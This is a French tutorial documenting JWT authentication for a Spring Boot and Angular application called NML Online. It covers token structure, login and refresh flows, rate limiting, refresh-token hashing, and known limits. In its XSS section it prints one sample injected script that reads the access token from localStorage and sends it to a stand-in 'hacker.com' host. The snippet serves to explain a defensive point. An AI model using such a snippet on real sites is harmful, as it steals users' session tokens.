# 🔐 Guide Complet d'Authentification JWT - NML Online

## Table des matières
1. [Introduction : Qu'est-ce que l'authentification ?](#1-introduction)
2. [Architecture globale](#2-architecture-globale)
3. [Les tokens JWT en détail](#3-les-tokens-jwt)
4. [Flux d'authentification complet](#4-flux-dauthentification)
5. [Sécurité côté Backend (Spring Boot)](#5-sécurité-backend)
6. [Sécurité côté Frontend (Angular)](#6-sécurité-frontend)
7. [Protections de sécurité implémentées](#7-protections-implémentées)
8. [Vulnérabilités potentielles et limites](#8-vulnérabilités-et-limites)
9. [Bonnes pratiques pour la production](#9-bonnes-pratiques-production)

---

## 1. Introduction : Qu'est-ce que l'authentification ? {#1-introduction}

### Le problème à résoudre
Quand un utilisateur se connecte à ton application, le serveur doit :
1. **Vérifier son identité** (authentification) : "Es-tu bien qui tu prétends être ?"
2. **Se souvenir de lui** pour les requêtes suivantes : HTTP est "stateless" (sans état)

### Deux approches principales

#### Sessions (méthode traditionnelle)
```
Utilisateur → Login → Serveur crée une session (stockée en mémoire/BDD)
                    → Renvoie un ID de session (cookie)
                    → À chaque requête, le serveur vérifie la session
```
**Problème** : Le serveur doit stocker l'état de chaque utilisateur connecté.

#### Tokens JWT (notre approche)
```
Utilisateur → Login → Serveur génère un token signé (JWT)
                    → Le client stocke ce token
                    → À chaque requête, envoie le token
                    → Le serveur VÉRIFIE la signature (pas de stockage)
```
**Avantage** : Le serveur est "stateless" - il n'a rien à stocker.

---

## 2. Architecture globale {#2-architecture-globale}

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              FRONTEND (Angular)                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────────────────┐   │
│  │ Login Page   │───▶│ Auth Effects │───▶│ ApiService.login()           │   │
│  └──────────────┘    └──────────────┘    └──────────────────────────────┘   │
│                              │                         │                     │
│                              ▼                         │                     │
│                     ┌──────────────┐                   │                     │
│                     │ Auth Reducer │                   │                     │
│                     │ (NgRx Store) │                   │                     │
│                     └──────────────┘                   │                     │
│                              │                         │                     │
│  ┌──────────────┐           │                         │                     │
│  │ TokenService │◀──────────┘                         │                     │
│  │ (localStorage)│                                     │                     │
│  └──────────────┘                                     │                     │
│         │                                              │                     │
│         ▼                                              ▼                     │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                    HTTP Interceptor                                  │    │
│  │  • Ajoute "Authorization: Bearer <token>" à chaque requête          │    │
│  │  • Intercepte les erreurs 401 (token expiré)                        │    │
│  │  • Déclenche le refresh automatique                                 │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                      │                                       │
└──────────────────────────────────────│───────────────────────────────────────┘
                                       │ HTTPS
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                              BACKEND (Spring Boot)                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                    JwtAuthenticationFilter                           │    │
│  │  • Extrait le token du header "Authorization"                       │    │
│  │  • Valide la signature et l'expiration                              │    │
│  │  • Peuple le SecurityContext avec l'utilisateur                     │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                      │                                       │
│                                      ▼                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                    SecurityConfig                                    │    │
│  │  • Définit quels endpoints sont publics/protégés                    │    │
│  │  • Configure CORS, CSRF, etc.                                       │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                      │                                       │
│                                      ▼                                       │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐                   │
│  │AuthController│    │  JwtService  │    │ UserService  │                   │
│  │ /api/login   │───▶│generateToken │───▶│ findByUser   │                   │
│  │ /api/refresh │    │validateToken │    │ checkPassword│                   │
│  │ /api/logout  │    └──────────────┘    └──────────────┘                   │
│  └──────────────┘                                                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Les tokens JWT en détail {#3-les-tokens-jwt}

### Qu'est-ce qu'un JWT ?

JWT = **J**SON **W**eb **T**oken

C'est une chaîne de caractères composée de 3 parties séparées par des points :

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIiwiaWQiOjEsIm5hbWUiOiJqb2huIiwiaWF0IjoxNzA3MzA4ODAwLCJleHAiOjE3MDczMDk0MDB9.X5K8mN3vP2qR7tY9wZ1aB3cD4eF5gH6iJ7kL8mN9oP0
│                      │                                                                                              │
└──────────────────────┴──────────────────────────────────────────────────────────────────────────────────────────────┘
      HEADER                                           PAYLOAD                                                SIGNATURE
```

### 1. HEADER (en-tête)
```json
{
  "alg": "HS256"    // Algorithme de signature utilisé
}
```
**Encodé en Base64** → `eyJhbGciOiJIUzI1NiJ9`

### 2. PAYLOAD (contenu)
```json
{
  "sub": "john",           // Subject : le username
  "id": 1,                 // ID de l'utilisateur (custom claim)
  "name": "john",          // Nom (custom claim)
  "iat": 1707308800,       // Issued At : date de création (timestamp)
  "exp": 1707309400        // Expiration : date d'expiration (timestamp)
}
```
**Encodé en Base64** → `eyJzdWIiOiJqb2huIi...`

⚠️ **IMPORTANT** : Le payload est ENCODÉ, pas CHIFFRÉ ! N'importe qui peut le lire !
```javascript
// N'importe qui peut décoder le payload :
atob("eyJzdWIiOiJqb2huIiwiaWQiOjF9") // → {"sub":"john","id":1}
```

### 3. SIGNATURE (la partie cruciale)
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY    // Clé secrète connue UNIQUEMENT du serveur
)
```

**C'est cette signature qui garantit l'intégrité du token !**

Si quelqu'un modifie le payload (ex: changer `"id": 1` en `"id": 2`), la signature ne correspondra plus, et le serveur rejettera le token.

### Comment ça fonctionne dans notre code

#### Génération (JwtService.java)
```java
public String generateToken(User user, long expirationMillis) {
    Date now = new Date();
    Date expiration = new Date(now.getTime() + expirationMillis);

    return Jwts.builder()
            .subject(user.getUsername())           // "sub" claim
            .claim("id", user.getId())             // Custom claim
            .claim("name", user.getUsername())     // Custom claim
            .issuedAt(now)                         // "iat" claim
            .expiration(expiration)                // "exp" claim
            .signWith(key)                         // Signature avec la clé secrète
            .compact();                            // Génère le token final
}
```

#### Validation (JwtService.java)
```java
public JwtClaims validateAndExtractClaims(String token) {
    Claims claims = Jwts.parser()
            .verifyWith(key)                       // Vérifie la signature
            .build()
            .parseSignedClaims(token)              // Parse et valide
            .getPayload();                         // Extrait le payload

    // Si on arrive ici, le token est valide !
    Long userId = claims.get("id", Long.class);
    String username = claims.getSubject();
    
    return new JwtClaims(userId, username);
}
```

---

## 4. Flux d'authentification complet {#4-flux-dauthentification}

### 4.1 Login (Connexion initiale)

```
┌──────────┐                                    ┌──────────┐                  ┌──────────┐
│  Client  │                                    │  Server  │                  │    DB    │
└────┬─────┘                                    └────┬─────┘                  └────┬─────┘
     │                                               │                              │
     │ POST /api/login                               │                              │
     │ { username: "john", password: "secret123" }   │                              │
     │──────────────────────────────────────────────▶│                              │
     │                                               │                              │
     │                                               │ SELECT * FROM users          │
     │                                               │ WHERE username = 'john'      │
     │                                               │─────────────────────────────▶│
     │                                               │                              │
     │                                               │◀─────────────────────────────│
     │                                               │ User { id: 1, password: $2a...}
     │                                               │                              │
     │                                               │ bcrypt.verify("secret123",   │
     │                                               │   "$2a$12$...")              │
     │                                               │ → true ✓                     │
     │                                               │                              │
     │                                               │ Generate Access Token (10min)│
     │                                               │ Generate Refresh Token       │
     │                                               │                              │
     │                                               │ Hash refresh token           │
     │                                               │ Store in DB                  │
     │                                               │─────────────────────────────▶│
     │                                               │                              │
     │ 200 OK                                        │                              │
     │ { token: "eyJ...", id: 1, name: "john" }      │                              │
     │ Set-Cookie: refresh_token=abc123; HttpOnly    │                              │
     │◀──────────────────────────────────────────────│                              │
     │                                               │                              │
     │ Store access token in localStorage            │                              │
     │                                               │                              │
```

### 4.2 Requête authentifiée

```
┌──────────┐                                    ┌──────────┐
│  Client  │                                    │  Server  │
└────┬─────┘                                    └────┬─────┘
     │                                               │
     │ GET /api/players/john                         │
     │ Authorization: Bearer eyJhbGciOi...           │
     │──────────────────────────────────────────────▶│
     │                                               │
     │                                    ┌──────────┴──────────┐
     │                                    │ JwtAuthFilter       │
     │                                    │                     │
     │                                    │ 1. Extract token    │
     │                                    │ 2. Verify signature │
     │                                    │ 3. Check expiration │
     │                                    │ 4. Set SecurityCtx  │
     │                                    └──────────┬──────────┘
     │                                               │
     │                                    ┌──────────┴──────────┐
     │                                    │ SecurityConfig      │
     │                                    │                     │
     │                                    │ /api/players/**     │
     │                                    │ → authenticated()   │
     │                                    │ → User is auth ✓    │
     │                                    └──────────┬──────────┘
     │                                               │
     │                                    ┌──────────┴──────────┐
     │                                    │ PlayerController    │
     │                                    │                     │
     │                                    │ Return player data  │
     │                                    └──────────┬──────────┘
     │                                               │
     │ 200 OK                                        │
     │ { id: 1, name: "john", money: 1000, ... }     │
     │◀──────────────────────────────────────────────│
```

### 4.3 Token expiré → Refresh automatique

```
┌──────────┐                                    ┌──────────┐
│  Client  │                                    │  Server  │
└────┬─────┘                                    └────┬─────┘
     │                                               │
     │ GET /api/players/john                         │
     │ Authorization: Bearer eyJ... (EXPIRÉ!)        │
     │──────────────────────────────────────────────▶│
     │                                               │
     │ 401 Unauthorized                              │
     │◀──────────────────────────────────────────────│
     │                                               │
     │ ┌─────────────────────────────────────────┐   │
     │ │ Interceptor détecte 401                 │   │
     │ │ → Déclenche refresh automatique         │   │
     │ └─────────────────────────────────────────┘   │
     │                                               │
     │ POST /api/auth/refresh                        │
     │ Cookie: refresh_token=abc123                  │
     │──────────────────────────────────────────────▶│
     │                                               │
     │                                    ┌──────────┴──────────┐
     │                                    │ 1. Read cookie      │
     │                                    │ 2. Hash token       │
     │                                    │ 3. Find user in DB  │
     │                                    │ 4. Check expiry     │
     │                                    │ 5. Generate new     │
     │                                    │    access token     │
     │                                    │ 6. Rotate refresh   │
     │                                    │    token            │
     │                                    └──────────┬──────────┘
     │                                               │
     │ 200 OK                                        │
     │ { valid: true, token: "eyJ...(NEW)" }         │
     │ Set-Cookie: refresh_token=xyz789; HttpOnly    │
     │◀──────────────────────────────────────────────│
     │                                               │
     │ ┌─────────────────────────────────────────┐   │
     │ │ Interceptor stocke le nouveau token     │   │
     │ │ → Rejoue la requête originale           │   │
     │ └─────────────────────────────────────────┘   │
     │                                               │
     │ GET /api/players/john                         │
     │ Authorization: Bearer eyJ...(NEW)             │
     │──────────────────────────────────────────────▶│
     │                                               │
     │ 200 OK                                        │
     │ { id: 1, name: "john", money: 1000, ... }     │
     │◀──────────────────────────────────────────────│
```

---

## 5. Sécurité côté Backend (Spring Boot) {#5-sécurité-backend}

### 5.1 JwtAuthenticationFilter

**Fichier** : `config/JwtAuthenticationFilter.java`

**Rôle** : Intercepte TOUTES les requêtes HTTP et vérifie le token JWT.

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    // OncePerRequestFilter = s'exécute UNE SEULE fois par requête
    
    @Override
    protected void doFilterInternal(request, response, filterChain) {
        // 1. Extraire le header "Authorization"
        String authHeader = request.getHeader("Authorization");
        
        // 2. Vérifier qu'il commence par "Bearer "
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response); // Continuer sans auth
            return;
        }
        
        // 3. Extraire le token (après "Bearer ")
        String jwt = authHeader.substring(7);
        
        // 4. Valider le token et extraire les infos
        JwtClaims claims = jwtService.validateAndExtractClaims(jwt);
        
        // 5. Créer un objet "Authentication" et le mettre dans le SecurityContext
        UsernamePasswordAuthenticationToken authToken = 
            new UsernamePasswordAuthenticationToken(claims.username(), null, []);
        SecurityContextHolder.getContext().setAuthentication(authToken);
        
        // 6. Continuer la chaîne de filtres
        filterChain.doFilter(request, response);
    }
    
    @Override
    protected boolean shouldNotFilter(request) {
        // Ne PAS filtrer les endpoints publics (login, register, refresh)
        String path = request.getServletPath();
        return path.equals("/api/login") || 
               path.equals("/api/register") ||
               path.startsWith("/api/auth/");
    }
}
```

### 5.2 SecurityConfig

**Fichier** : `config/SecurityConfig.java`

**Rôle** : Configure les règles de sécurité Spring Security.

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        
        // 1. Configurer CORS (Cross-Origin Resource Sharing)
        http.cors(cors -> cors.configurationSource(corsConfigurationSource));
        
        // 2. Définir les règles d'accès
        http.authorizeHttpRequests(auth -> auth
            // Endpoints PUBLICS (pas besoin de token)
            .requestMatchers("/api/login", "/api/register", 
                           "/api/auth/refresh", "/api/auth/logout").permitAll()
            
            // Fichiers statiques (Angular)
            .requestMatchers("/", "/index.html", "/*.js", "/*.css").permitAll()
            
            // TOUS les autres endpoints API → nécessitent authentification
            .requestMatchers("/api/**").authenticated()
        );
        
        // 3. Ajouter notre filtre JWT AVANT le filtre standard
        http.addFilterBefore(jwtAuthenticationFilter, 
                           UsernamePasswordAuthenticationFilter.class);
        
        // 4. Désactiver CSRF (pas nécessaire avec JWT stateless)
        http.csrf(csrf -> csrf.disable());
        
        // 5. Mode STATELESS (pas de session côté serveur)
        http.sessionManagement(sm -> 
            sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
        
        return http.build();
    }
}
```

### 5.3 Stockage sécurisé du Refresh Token

Le refresh token n'est **JAMAIS stocké en clair** dans la base de données !

```java
// Dans AuthController.java - lors du login

// 1. Générer un token aléatoire (64 bytes = 512 bits)
String refreshToken = generateRefreshToken();
// Exemple: "a1b2c3d4e5f6g7h8..."

// 2. Hasher avec SHA-256 + PEPPER (secret côté serveur)
String transformed = SHA256(refreshToken + PEPPER);
// Le PEPPER ajoute une couche de sécurité même si la DB est compromise

// 3. Hasher ENCORE avec BCrypt (pour résister au brute-force)
String finalHash = BCrypt.hash(transformed);
// "$2a$12$..." → stocké en DB

// 4. Envoyer le token ORIGINAL au client (dans un cookie HttpOnly)
Cookie cookie = new Cookie("refresh_token", refreshToken);
cookie.setHttpOnly(true);  // JavaScript ne peut PAS y accéder
cookie.setSecure(true);    // Envoyé uniquement en HTTPS
cookie.setPath("/api/auth"); // Envoyé uniquement pour /api/auth/*
```

**Pourquoi ce double hashage ?**
- **SHA-256 + PEPPER** : Même si un hacker vole la DB, il ne peut pas recalculer le hash sans le PEPPER
- **BCrypt** : Même s'il a le PEPPER, BCrypt est lent (~100ms par essai), rendant le brute-force impraticable

---

## 6. Sécurité côté Frontend (Angular) {#6-sécurité-frontend}

### 6.1 TokenService

**Fichier** : `services/token.service.ts`

**Rôle** : Gestion centralisée des tokens (stockage, refresh, etc.)

```typescript
@Injectable({ providedIn: 'root' })
export class TokenService {
  // État partagé pour gérer les race conditions
  private isRefreshing = false;
  private refreshTokenSubject = new BehaviorSubject<string | null>(null);
  
  // Cooldown pour éviter le spam de refresh
  private lastRefreshTime = 0;
  private readonly REFRESH_COOLDOWN_MS = 2000; // 2 secondes
  
  /**
   * Effectue un refresh du token.
   * Gère les race conditions : si plusieurs requêtes échouent en même temps,
   * une seule refresh est lancée, les autres attendent.
   */
  refreshToken(): Observable<string> {
    // Vérifier le cooldown
    const now = Date.now();
    if (now - this.lastRefreshTime < this.REFRESH_COOLDOWN_MS) {
      if (this.isRefreshing) {
        return this.waitForRefresh(); // Attendre le refresh en cours
      }
      return throwError(() => new Error('Rate limited'));
    }
    
    // Si un refresh est déjà en cours, attendre
    if (this.isRefreshing) {
      return this.waitForRefresh();
    }
    
    // Lancer le refresh
    this.isRefreshing = true;
    this.lastRefreshTime = now;
    
    return this.http.post<RefreshResponse>('/api/auth/refresh', {}, 
      { withCredentials: true } // Envoie les cookies !
    ).pipe(
      switchMap(response => {
        if (response.valid && response.token) {
          this.setAccessToken(response.token);
          this.refreshTokenSubject.next(response.token); // Notifie les autres
          return of(response.token);
        }
        throw new Error('Invalid refresh');
      }),
      finalize(() => {
        this.isRefreshing = false;
      })
    );
  }
}
```

### 6.2 HTTP Interceptor

**Fichier** : `services/auth.interceptor.ts`

**Rôle** : Intercepte automatiquement toutes les requêtes HTTP.

```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const tokenService = inject(TokenService);
  const router = inject(Router);
  const store = inject(Store);
  
  // 1. Ne pas intercepter les requêtes d'auth
  if (isAuthRequest(req.url)) {
    return next(req);
  }
  
  // 2. Ajouter le token si présent
  const token = tokenService.getAccessToken();
  const authReq = token ? addTokenToRequest(req, token) : req;
  
  // 3. Envoyer la requête et gérer les erreurs
  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401) {
        // Token expiré → tenter un refresh
        return tokenService.refreshToken().pipe(
          switchMap(newToken => {
            // Rejouer la requête avec le nouveau token
            return next(addTokenToRequest(req, newToken));
          }),
          catchError(() => {
            // Refresh échoué → déconnexion
            tokenService.clearAuth();
            store.dispatch(AuthActions.logoutSuccess());
            router.navigate(['/login']);
            return throwError(() => error);
          })
        );
      }
      return throwError(() => error);
    })
  );
};
```

### 6.3 Auth Guard

**Fichier** : `guards/auth.guard.ts`

**Rôle** : Protège les routes qui nécessitent une authentification.

```typescript
export const authGuard: CanActivateFn = (route, state) => {
  const store = inject(Store);
  const router = inject(Router);
  
  // Attendre que l'initialisation soit terminée
  return store.select(selectAuthLoading).pipe(
    filter(loading => !loading), // Attendre que loading = false
    take(1),
    map(() => {
      // Vérifier si authentifié
      let isAuthenticated = false;
      store.select(selectIsAuthenticated).pipe(take(1))
        .subscribe(auth => isAuthenticated = auth);
      
      if (isAuthenticated) {
        return true; // Accès autorisé
      }
      
      // Rediriger vers login avec URL de retour
      return router.createUrlTree(['/login'], {
        queryParams: { returnUrl: state.url }
      });
    })
  );
};
```

---

## 7. Protections de sécurité implémentées {#7-protections-implémentées}

### ✅ 7.1 Protection contre le vol de token (Access Token)

| Mesure | Description |
|--------|-------------|
| **Durée courte** | Access token expire en 10 minutes |
| **Pas de stockage serveur** | Même si volé, on ne peut pas le révoquer, mais il expire vite |
| **HTTPS obligatoire** | Le token transite toujours chiffré |

### ✅ 7.2 Protection contre le vol de Refresh Token

| Mesure | Description |
|--------|-------------|
| **Cookie HttpOnly** | JavaScript ne peut PAS lire le cookie |
| **Cookie Secure** | Cookie envoyé uniquement en HTTPS |
| **Cookie SameSite=Lax** | Protection contre CSRF basique |
| **Path restreint** | Cookie envoyé uniquement pour `/api/auth/*` |
| **Rotation** | À chaque refresh, un NOUVEAU refresh token est généré |
| **Hash en DB** | Seul le hash est stocké (SHA-256 + PEPPER + BCrypt) |

### ✅ 7.3 Protection contre le Brute Force

```java
// Dans AuthController.java

private static final int MAX_ATTEMPTS = 5;
private static final long BLOCK_TIME_MS = 60_000; // 1 minute

// Comptage par IP + username
String key = request.getRemoteAddr() + ":" + username;
Attempt att = attempts.get(key);

if (att.count >= MAX_ATTEMPTS) {
    att.blockedUntil = now + BLOCK_TIME_MS;
    return ResponseEntity.status(429).body("Too many attempts");
}

// Délai artificiel pour ralentir les attaques
Thread.sleep(500); // 500ms entre chaque tentative
```

### ✅ 7.4 Protection contre le Timing Attack

```java
// Même si l'utilisateur n'existe pas, on prend le même temps
Thread.sleep(500); // Toujours 500ms, succès ou échec
```

### ✅ 7.5 Protection des mots de passe

```java
// BCrypt avec coût 12 (2^12 = 4096 itérations)
String hash = new BCryptPasswordEncoder(12).encode(password);

// Vérification en temps constant
encoder.matches(rawPassword, storedHash);
```

### ✅ 7.6 Protection contre le spam de Refresh

```java
// Côté backend
private static final long REFRESH_MIN_INTERVAL_MS = 1000; // 1 seconde

if (timeSinceLastRefresh < REFRESH_MIN_INTERVAL_MS) {
    if (refreshCount > 3) {
        return ResponseEntity.status(429).body("Too many requests");
    }
}

// Côté frontend
private readonly REFRESH_COOLDOWN_MS = 2000; // 2 secondes
```

### ✅ 7.7 Protection CSRF

| Mesure | Description |
|--------|-------------|
| **CSRF désactivé** | Car API REST stateless avec JWT |
| **SameSite=Lax** | Le cookie n'est pas envoyé depuis un autre site |
| **Origin check** | CORS vérifie l'origine des requêtes |

### ✅ 7.8 Race Conditions (Frontend)

```typescript
// Problème : 10 requêtes échouent en même temps → 10 refresh ?
// Solution : Un seul refresh, les autres attendent

if (this.isRefreshing) {
    // Attendre le résultat du refresh en cours
    return this.refreshTokenSubject.pipe(
        filter(token => token !== null),
        take(1)
    );
}

this.isRefreshing = true;
// ... faire le refresh ...
this.refreshTokenSubject.next(newToken); // Notifie tout le monde
```

### ✅ 7.9 Protection anti-spam F5 (NOUVEAU)

**Le problème** : Si un utilisateur spam F5 (refresh de page), plusieurs requêtes de refresh partent en parallèle. La première réussit et invalide le refresh token, les suivantes échouent → déconnexion !

**Solution multi-couches** :

#### Côté Frontend (TokenService)
```typescript
// 1. Lock persistant en sessionStorage (survit au refresh de page)
private readonly REFRESH_LOCK_KEY = 'nml_refresh_lock';
private readonly REFRESH_TIME_KEY = 'nml_last_refresh';
private readonly REFRESH_COOLDOWN_MS = 3000; // 3 secondes

// 2. Vérifier le lock AVANT de lancer un refresh
if (this.isRefreshLocked()) {
  // Un autre onglet/refresh fait déjà le travail
  return this.waitAndRetry();
}

// 3. Si on est dans le cooldown et qu'on a déjà un token, l'utiliser
if (this.isInCooldown()) {
  const existingToken = this.getAccessToken();
  if (existingToken) {
    return of(existingToken); // Pas besoin de refresh !
  }
}

// 4. Acquérir le lock avant de faire le refresh
sessionStorage.setItem(this.REFRESH_LOCK_KEY, Date.now().toString());
```

#### Côté Backend (AuthController)
```java
// Grace period : Si on reçoit le même token dans les 3 secondes,
// renvoyer le même résultat sans re-générer

private static final long GRACE_PERIOD_MS = 3000;

if (timeSinceLastRefresh < GRACE_PERIOD_MS) {
    // Vérifier si c'est le même token ou l'ancien
    if (refreshToken.equals(throttle.lastToken) || 
        refreshToken.equals(throttle.previousToken)) {
        // Renvoyer le résultat précédent
        return ResponseEntity.ok(throttle.lastResponse);
    }
}
```

**Résultat** : Même en spammant F5 toutes les 100ms pendant 5 secondes, l'utilisateur reste connecté !

---

## 8. Vulnérabilités potentielles et limites {#8-vulnérabilités-et-limites}

### ⚠️ 8.1 XSS (Cross-Site Scripting)

**Le risque** : Si un attaquant injecte du JavaScript malveillant dans l'app...

```javascript
// Code malveillant injecté
const token = localStorage.getItem('accessToken');
fetch('https://hacker.com/steal?token=' + token);
```

**Statut actuel** : L'access token est dans `localStorage`, vulnérable au XSS.

**Pourquoi c'est acceptable ici** :
- L'access token expire en 10 minutes
- Le refresh token est dans un cookie HttpOnly (inaccessible au JS)
- Angular a des protections XSS intégrées (sanitization)

**Comment renforcer** :
```typescript
// Option 1 : Stocker l'access token en mémoire seulement (pas localStorage)
// Inconvénient : perdu au refresh de page

// Option 2 : Utiliser un cookie HttpOnly pour l'access token aussi
// Inconvénient : complexifie la gestion, pas standard pour SPA
```

### ⚠️ 8.2 Token Revocation

**Le problème** : On ne peut PAS révoquer un access token avant son expiration.

**Scénario** :
1. User se connecte sur PC public
2. Copie le token
3. Se déconnecte
4. Le token est toujours valide pendant 10 min !

**Pourquoi c'est acceptable** :
- Durée courte (10 min)
- Le refresh token EST révoqué (supprimé de la DB)

**Comment renforcer** :
```java
// Option : Maintenir une "blacklist" de tokens révoqués
// Vérifier à chaque requête si le token est blacklisté
// Inconvénient : Ajoute de l'état côté serveur (perd le bénéfice stateless)
```

### ⚠️ 8.3 Secret Key Management

**Le risque** : Si la clé secrète JWT fuite...

```properties
# application.properties - À NE PAS COMMIT !
jwt.secret=votre-cle-secrete-jwt-tres-longue-minimum-32-caracteres
```

**Impact** : Un attaquant peut forger n'importe quel token valide !

**Statut actuel** : Clé dans `application.properties` (OK pour dev, PAS pour prod)

### ⚠️ 8.4 Algorithme JWT

**Statut** : Utilisation de HS256 (HMAC-SHA256)

**Risque historique** : Attaque "alg:none" où le header est modifié pour bypasser la signature.

**Protection** : La librairie `jjwt` moderne est protégée contre cette attaque.

### ⚠️ 8.5 Énumération d'utilisateurs

**Le risque** : Un attaquant peut découvrir quels usernames existent.

```
POST /api/login { username: "admin", password: "test" }
→ "Identifiants invalides"  // admin existe-t-il ?

POST /api/login { username: "zzzzz", password: "test" }
→ "Identifiants invalides"  // Même message = bien !
```

**Statut** : OK - Le message d'erreur est le même dans tous les cas.

---

## 9. Bonnes pratiques pour la production {#9-bonnes-pratiques-production}

### 🔒 9.1 Variables d'environnement

```properties
# ❌ NE PAS FAIRE (secrets en dur)
jwt.secret=ma-cle-secrete

# ✅ FAIRE (variables d'environnement)
jwt.secret=${JWT_SECRET}
jwt.pepper=${JWT_PEPPER}
```

```bash
# Définir au déploiement
export JWT_SECRET="$(openssl rand -base64 64)"
export JWT_PEPPER="$(openssl rand -base64 32)"
```

### 🔒 9.2 HTTPS obligatoire

```properties
# application.properties
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=${SSL_KEYSTORE_PASSWORD}

# Cookie secure = true en production
app.cookie.secure=true
```

### 🔒 9.3 Headers de sécurité

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> 
            csp.policyDirectives("default-src 'self'"))
        .xssProtection(xss -> xss.enable())
        .contentTypeOptions(cto -> cto.enable())
        .frameOptions(fo -> fo.deny())
    );
}
```

### 🔒 9.4 Logging de sécurité

```java
// Logger les tentatives de connexion échouées
logger.warn("Failed login attempt for user {} from IP {}", 
    username, request.getRemoteAddr());

// Logger les accès suspects
logger.warn("Invalid JWT token from IP {}: {}", 
    request.getRemoteAddr(), e.getMessage());
```

### 🔒 9.5 Rotation des clés

```java
// Supporter plusieurs clés pour permettre la rotation
List<SecretKey> validKeys = Arrays.asList(
    currentKey,
    previousKey  // Valide pendant 24h après rotation
);

// Générer de nouvelles clés régulièrement (ex: tous les 30 jours)
```

---

## Glossaire

| Terme | Définition |
|-------|------------|
| **JWT** | JSON Web Token - Token auto-contenu avec signature |
| **Access Token** | Token courte durée (10 min) pour accéder aux API |
| **Refresh Token** | Token longue durée (1-30 jours) pour obtenir de nouveaux access tokens |
| **BCrypt** | Algorithme de hashage lent, résistant au brute-force |
| **HMAC-SHA256** | Algorithme de signature utilisant une clé secrète |
| **HttpOnly** | Flag cookie empêchant l'accès JavaScript |
| **Secure** | Flag cookie imposant HTTPS |
| **SameSite** | Flag cookie contre les requêtes cross-site |
| **CORS** | Cross-Origin Resource Sharing - contrôle d'accès inter-domaines |
| **CSRF** | Cross-Site Request Forgery - attaque forçant des actions |
| **XSS** | Cross-Site Scripting - injection de code JavaScript |
| **Stateless** | Sans état côté serveur (pas de session) |
| **Race Condition** | Bug quand plusieurs opérations concurrentes interfèrent |

---

## Fichiers clés de l'implémentation

| Fichier | Rôle |
|---------|------|
| `JwtService.java` | Génération et validation des tokens JWT |
| `JwtAuthenticationFilter.java` | Filtre vérifiant le token sur chaque requête |
| `SecurityConfig.java` | Configuration des règles de sécurité Spring |
| `AuthController.java` | Endpoints login/register/refresh/logout |
| `UserService.java` | Gestion des utilisateurs et mots de passe |
| `token.service.ts` | Gestion des tokens côté client |
| `auth.interceptor.ts` | Ajout automatique du token aux requêtes |
| `auth.guard.ts` | Protection des routes Angular |
| `auth.effects.ts` | Logique asynchrone NgRx (login, logout, refresh) |
| `auth.reducer.ts` | État de l'authentification |

